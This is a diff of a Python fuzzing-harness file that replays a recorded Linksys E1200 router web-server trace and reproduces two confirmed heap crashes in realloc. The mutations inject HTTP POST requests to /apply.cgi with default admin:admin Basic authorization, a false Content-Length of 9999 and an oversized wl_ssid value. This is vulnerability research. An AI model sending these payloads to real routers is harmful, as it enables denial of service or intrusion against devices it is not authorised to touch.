@@ -40,48 +40,50 @@ TRACE      = str(ROOT / 'tests/seeds/Linksys_E1200_post.trace')
 FORK_POINT = 104
 GDB_PORT   = 9998
 
-# Mutations extracted from confirmed crash 7ed84369 (realloc+0x218)
-# All at network-FD syscall indices (106, 107, 109)
+# Mutations for confirmed crash 7ed84369 (realloc+0x218)
+# Re-recorded trace (2026-04-10): idx=136=read(256B headers), idx=138=read(116B body)
+# Both reads must be mutated to inject consistent oversized payload.
 MUTATIONS_7ED84369 = [
-    FuzzInstruction(syscall_index=109, cmd=8,  arg_index=1,
+    # Inflate header read + inject new headers claiming Content-Length: 9999
+    FuzzInstruction(syscall_index=136, cmd=8,  arg_index=1,
                     data=b'\x00\x04\x00\x00', offset=0, size=4,
                     mutation_type='http_extend'),
-    FuzzInstruction(syscall_index=109, cmd=5,  arg_index=1,
+    FuzzInstruction(syscall_index=136, cmd=5,  arg_index=1,
                     data=(b'POST /apply.cgi HTTP/1.1\r\n'
                           b'Host: 127.0.0.1\r\n'
                           b'Authorization: Basic YWRtaW46YWRtaW4=\r\n'
                           b'Content-Type: application/x-www-form-urlencoded\r\n'
-                          b'Content-Length: 9999\r\n\r\n'
-                          b'submit_button=Wireless_Basic&action=Apply'
-                          b'&wl_ssid=' + b'A' * 64),
-                    offset=0, size=117, mutation_type='http_request'),
-    FuzzInstruction(syscall_index=107, cmd=11, arg_index=1,
-                    data=b'\x0e&', offset=0, size=2,
-                    mutation_type='overwrite_offset'),
-    # Compact header so Content-Length fits within first 67 bytes of aux_size
-    # "POST /apply.cgi HTTP/1.1\r\nContent-Length: 9999\r\n\r\n" = 51 bytes → fits!
-    FuzzInstruction(syscall_index=106, cmd=8,  arg_index=1,
+                          b'Content-Length: 9999\r\n\r\n'),
+                    offset=0, size=96, mutation_type='http_request'),
+    # Inflate body read + inject oversized POST body → realloc overflow
+    FuzzInstruction(syscall_index=138, cmd=8,  arg_index=1,
                     data=b'\x00\x04\x00\x00', offset=0, size=4,
                     mutation_type='http_extend'),
-    FuzzInstruction(syscall_index=106, cmd=5,  arg_index=1,
-                    data=(b'POST /apply.cgi HTTP/1.1\r\n'
-                          b'Content-Length: 9999\r\n\r\n'
-                          b'submit_button=Wireless_Basic&'
-                          b'action=Apply&wl_ssid='),
-                    offset=0, size=67, mutation_type='http_request'),
+    FuzzInstruction(syscall_index=138, cmd=5,  arg_index=1,
+                    data=(b'submit_button=Wireless_Basic&'
+                          b'action=Apply&wl_ssid=' + b'A' * 87),
+                    offset=0, size=116, mutation_type='http_request'),
 ]
 
-# Mutations from a5b07455 (realloc+0x150) — compact headers within 67-byte aux limit
+# Mutations from a5b07455 (realloc+0x150) — net-only minimal trigger
+# Both HTTP reads (idx=136 headers, idx=138 body) needed for consistent overflow.
 MUTATIONS_A5B07455_NET = [
-    FuzzInstruction(syscall_index=106, cmd=8,  arg_index=1,
+    FuzzInstruction(syscall_index=136, cmd=8,  arg_index=1,
                     data=b'\x00\x04\x00\x00', offset=0, size=4,
                     mutation_type='http_extend'),
-    FuzzInstruction(syscall_index=106, cmd=5,  arg_index=1,
+    FuzzInstruction(syscall_index=136, cmd=5,  arg_index=1,
                     data=(b'POST /apply.cgi HTTP/1.1\r\n'
                           b'Content-Length: 9999\r\n\r\n'
                           b'submit_button=Wireless_Basic&'
                           b'action=Apply&wl_ssid='),
                     offset=0, size=67, mutation_type='http_request'),
+    FuzzInstruction(syscall_index=138, cmd=8,  arg_index=1,
+                    data=b'\x00\x04\x00\x00', offset=0, size=4,
+                    mutation_type='http_extend'),
+    FuzzInstruction(syscall_index=138, cmd=5,  arg_index=1,
+                    data=(b'submit_button=Wireless_Basic&'
+                          b'action=Apply&wl_ssid=' + b'A' * 87),
+                    offset=0, size=116, mutation_type='http_request'),
 ]
 
 VARIANT_SETS = {
